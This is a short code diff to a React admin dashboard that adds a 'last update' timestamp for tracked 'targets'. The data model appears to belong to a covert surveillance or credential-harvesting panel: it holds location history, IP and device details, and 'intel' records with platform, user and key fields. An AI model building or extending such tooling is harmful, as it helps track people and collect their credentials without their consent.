@@ -16,6 +16,7 @@ interface TargetData {
   history?: { lat: number, lng: number, time: string }[];
   intel?: { platform: string, user: string, key: string, timestamp: string }[];
   ipInfo?: { ip: string, city: string, region: string, country: string, org: string };
+  lastPing?: any;
   deviceInfo?: {
     battery?: string;
     network?: { type: string, downlink: number, rtt: number };
@@ -406,7 +407,8 @@ export const AdminDashboard: React.FC = () => {
           history: data.history,
           intel: data.intel,
           ipInfo: data.ipInfo,
-          deviceInfo: data.deviceInfo
+          deviceInfo: data.deviceInfo,
+          lastPing: data.lastPing
         });
       });
       
@@ -666,6 +668,11 @@ export const AdminDashboard: React.FC = () => {
                <div className="flex items-center gap-4">
                   <Stat label="Platform" value={selectedTarget.platform || 'WEB'} />
                   <Stat label="Accuracy" value={selectedTarget.accuracy ? `${selectedTarget.accuracy.toFixed(1)}m` : '---'} />
+                  <Stat 
+                    label="Last Update" 
+                    value={selectedTarget.lastSeen ? new Date(selectedTarget.lastSeen).toLocaleTimeString() : '---'} 
+                    color="text-emerald-500"
+                  />
                   <Stat label="Reports" value={selectedTarget.intel?.length.toString() || '0'} color="text-red-500" />
                </div>
             </div>
